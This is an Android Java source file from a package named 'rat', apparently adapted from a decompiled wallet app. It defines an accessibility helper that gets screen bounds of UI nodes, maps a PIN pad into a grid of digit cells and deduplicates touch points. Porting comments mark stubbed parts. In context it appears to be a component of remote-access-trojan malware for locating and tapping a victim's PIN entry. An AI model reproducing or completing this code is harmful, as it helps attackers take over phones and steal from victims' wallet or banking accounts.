package com.vendor.rat.helper;

import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.HashMap;
import java.util.LinkedList;
import java.util.ListIterator;

/**
 * Vendor: com.guard.wallet.helper.a
 * Utility for accessibility node bounds calculations - grid mapping for PIN pad,
 * bounds correction for multi-display, and point deduplication.
 */
public abstract class NodeBoundsHelper {

    public static Rect getBounds(AccessibilityNodeInfo nodeInfo) {
        Rect rect = new Rect();
        if (Build.VERSION.SDK_INT >= 34) {
            nodeInfo.getBoundsInWindow(rect);
        } else {
            nodeInfo.getBoundsInScreen(rect);
        }
        correctBounds(rect);
        return rect;
    }

    public static HashMap<Integer, Rect> buildGridMap(Rect rect) {
        HashMap<Integer, Rect> map = new HashMap<>();
        float cellWidth = rect.width() / 3.0f;
        float cellHeight = rect.height() / 4.0f;
        for (int i = 0; i <= 9; i++) {
            Rect cellRect;
            if (i == 0) {
                float x = rect.left + cellWidth;
                float y = (cellHeight * 3.0f) + rect.top;
                cellRect = new Rect((int) x, (int) y, (int) (x + cellWidth), (int) (y + cellHeight));
            } else {
                int idx = i - 1;
                float y = ((idx / 3) * cellHeight) + rect.top;
                float x = ((idx % 3) * cellWidth) + rect.left;
                cellRect = new Rect((int) x, (int) y, (int) (x + cellWidth), (int) (y + cellHeight));
            }
            map.put(i, cellRect);
        }
        return map;
    }

    public static void correctBounds(Rect rect) {
        // ADAPT: vendor uses ScreenMetricsVO from utils.e.e()
        // Corrects bounds for multi-display offset
        // TODO: VENDOR_VERIFY - screen metrics correction
    }

    public static void deduplicatePoints(LinkedList<?> points) {
        if (points.isEmpty()) {
            return;
        }
        ListIterator<?> it = points.listIterator();
        Object prev = null;
        while (it.hasNext()) {
            Object point = it.next();
            if (point == null) {
                it.remove();
            } else {
                if (point.equals(prev)) {
                    it.remove();
                }
                prev = point;
            }
        }
    }
}
